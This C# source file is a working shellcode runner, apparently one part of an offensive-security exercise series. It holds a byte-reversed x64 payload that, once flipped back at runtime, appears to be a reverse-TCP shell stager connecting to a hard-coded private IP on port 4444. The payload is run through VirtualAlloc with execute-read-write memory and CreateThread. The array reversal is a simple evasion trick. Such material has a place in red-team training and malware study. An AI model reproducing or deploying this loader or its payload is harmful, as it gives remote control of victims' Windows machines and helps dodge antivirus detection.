using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Part8
{
    class Program
    {
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            IntPtr threatHandle = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr parameter = IntPtr.Zero;

            byte[] shellcode = { 0xd5, 0xff, 0x56, 0xa2, 0xb5, 0xf0, 0xc2, 0xc7, 0x49, 0x59, 0x00, 0x6a, 0x58, 0xe7, 0xff, 0x41, 0xb4, 0x75, 0xf6, 0x85, 0x48, 0xc6, 0x29, 0x48, 0xc3, 0x01, 0x48, 0xff, 0xff, 0xff, 0x3c, 0xe9, 0xce, 0xff, 0x49, 0xd5, 0xff, 0x61, 0x4d, 0x6e, 0x75, 0xba, 0x41, 0x59, 0x57, 0xd5, 0xff, 0x30, 0x0f, 0x2f, 0x0b, 0xba, 0x41, 0x5a, 0x00, 0x6a, 0x58, 0x41, 0x00, 0x00, 0x40, 0x00, 0x68, 0x59, 0x57, 0x41, 0x58, 0x28, 0x7d, 0x00, 0xf8, 0x83, 0xd5, 0xff, 0x5f, 0xc8, 0xd9, 0x02, 0xba, 0x41, 0xf9, 0x89, 0x48, 0xda, 0x89, 0x48, 0xf0, 0x89, 0x49, 0xc9, 0x31, 0x4d, 0xc7, 0x89, 0x49, 0xc3, 0x89, 0x48, 0xd5, 0xff, 0xe5, 0x53, 0xa4, 0x58, 0xba, 0x41, 0xc9, 0x31, 0x48, 0xf2, 0x89, 0x48, 0x58, 0x41, 0x00, 0x00, 0x10, 0x00, 0x68, 0x59, 0x41, 0x40, 0x6a, 0xf6, 0x89, 0x5e, 0x20, 0xc4, 0x83, 0x48, 0x55, 0x7e, 0x00, 0xf8, 0x83, 0xd5, 0xff, 0x5f, 0xc8, 0xd9, 0x02, 0xba, 0x41, 0xf9, 0x89, 0x48, 0x58, 0x41, 0x04, 0x6a, 0xc9, 0x31, 0x4d, 0xe2, 0x89, 0x48, 0x10, 0xec, 0x83, 0x48, 0x00, 0x00, 0x00, 0x93, 0xe8, 0xe5, 0x75, 0xce, 0xff, 0x49, 0x0a, 0x74, 0xc0, 0x85, 0xd5, 0xff, 0x61, 0x74, 0xa5, 0x99, 0xba, 0x41, 0xf9, 0x89, 0x48, 0xe2, 0x89, 0x4c, 0x58, 0x41, 0x10, 0x6a, 0xc7, 0x89, 0x48, 0xd5, 0xff, 0xe0, 0xdf, 0x0f, 0xea, 0xba, 0x41, 0xc1, 0x89, 0x48, 0xc0, 0xff, 0x48, 0xc2, 0x89, 0x48, 0xc0, 0xff, 0x48, 0xc0, 0x31, 0x4d, 0xc9, 0x31, 0x4d, 0x50, 0x50, 0x5e, 0x41, 0x0a, 0x6a, 0xd5, 0xff, 0x00, 0x6b, 0x80, 0x29, 0xba, 0x41, 0x59, 0x00, 0x00, 0x01, 0x01, 0x68, 0xea, 0x89, 0x4c, 0xd5, 0xff, 0x07, 0x26, 0x77, 0x4c, 0xba, 0x41, 0xf1, 0x89, 0x4c, 0xe4, 0x89, 0x49, 0x54, 0x41, 0x72, 0x02, 0xa8, 0xc0, 0x5c, 0x11, 0x00, 0x02, 0xbc, 0x49, 0xe5, 0x89, 0x49, 0x00, 0x00, 0x01, 0xa0, 0xec, 0x81, 0x48, 0xe6, 0x89, 0x49, 0x56, 0x41, 0x00, 0x00, 0x32, 0x33, 0x5f, 0x32, 0x73, 0x77, 0xbe, 0x49, 0x5d, 0xff, 0xff, 0xff, 0x4b, 0xe9, 0x12, 0x8b, 0x48, 0x5a, 0x59, 0x41, 0x58, 0xe0, 0xff, 0x52, 0x41, 0x20, 0xec, 0x83, 0x48, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x41, 0x5a, 0x59, 0x5e, 0x58, 0x41, 0xd0, 0x01, 0x48, 0x58, 0x41, 0x88, 0x04, 0x8b, 0x41, 0xd0, 0x01, 0x49, 0x1c, 0x40, 0x8b, 0x44, 0x48, 0x0c, 0x8b, 0x41, 0x66, 0xd0, 0x01, 0x49, 0x24, 0x40, 0x8b, 0x44, 0x58, 0xd8, 0x75, 0xd1, 0x39, 0x45, 0x08, 0x24, 0x4c, 0x03, 0x4c, 0xf1, 0x75, 0xe0, 0x38, 0xc1, 0x01, 0x41, 0x0d, 0xc9, 0xc1, 0x41, 0xac, 0xc0, 0x31, 0x48, 0xd6, 0x01, 0x48, 0xc9, 0x31, 0x4d, 0x88, 0x34, 0x8b, 0x41, 0xc9, 0xff, 0x48, 0x56, 0xe3, 0xd0, 0x01, 0x49, 0x18, 0x48, 0x8b, 0x20, 0x40, 0x8b, 0x44, 0x50, 0xd0, 0x01, 0x48, 0x67, 0x74, 0xc0, 0x85, 0x48, 0x00, 0x00, 0x00, 0x88, 0x80, 0x8b, 0x00, 0x00, 0x00, 0x72, 0x85, 0x0f, 0x02, 0x0b, 0x18, 0x78, 0x81, 0x66, 0xd0, 0x01, 0x48, 0x51, 0x41, 0x3c, 0x42, 0x8b, 0x20, 0x52, 0x8b, 0x48, 0x52, 0xed, 0xe2, 0xc1, 0x01, 0x41, 0x0d, 0xc9, 0xc1, 0x41, 0x20, 0x2c, 0x02, 0x7c, 0x61, 0x3c, 0xac, 0xc0, 0x31, 0x48, 0x50, 0x72, 0x8b, 0x48, 0xc9, 0x31, 0x4d, 0x4a, 0x4a, 0xb7, 0x0f, 0x48, 0x20, 0x52, 0x8b, 0x48, 0x18, 0x52, 0x8b, 0x48, 0x60, 0x52, 0x8b, 0x48, 0x65, 0x56, 0xd2, 0x31, 0x48, 0x51, 0x52, 0x50, 0x41, 0x51, 0x41, 0x00, 0x00, 0x00, 0xcc, 0xe8, 0xf0, 0xe4, 0x83, 0x48, 0xfc };
            Array.Reverse(shellcode);


            UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

            threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

            WaitForSingleObject(threatHandle, 0xFFFFFFFF);


        }
    }
}
